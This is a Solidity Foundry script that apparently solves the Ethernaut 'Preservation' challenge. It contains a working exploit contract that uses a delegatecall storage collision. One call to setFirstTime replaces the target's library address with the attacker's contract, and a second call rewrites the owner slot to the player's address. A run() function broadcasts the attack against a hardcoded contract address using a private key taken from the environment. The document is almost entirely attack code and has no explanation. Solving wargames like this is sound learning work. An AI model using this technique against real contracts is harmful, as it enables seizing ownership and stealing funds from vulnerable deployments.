pragma solidity ^0.8;

import "forge-std/Script.sol";
import "forge-std/console.sol";

interface IPreservation {
    function owner() external view returns (address);
    function setFirstTime(uint256) external;
}

contract Hack {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function attack(IPreservation _target, address _player) external {
        _target.setFirstTime(uint256(uint160(address(this))));
        _target.setFirstTime(uint256(uint160(_player)));
        require(_target.owner() == _player, "Hack failed");
    }

    function setTime(uint256 _owner) external {
        owner = address(uint160(_owner));
    }
}


contract PreservationSolution is Script {

    IPreservation target = IPreservation(0x4D0Ae83B2a047C095Eb9443D841A25c7472fF423);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        address player = vm.envAddress("MY_ADDRESS");
        Hack hack = new Hack();
        hack.attack(target, player);
        vm.stopBroadcast();
    }
}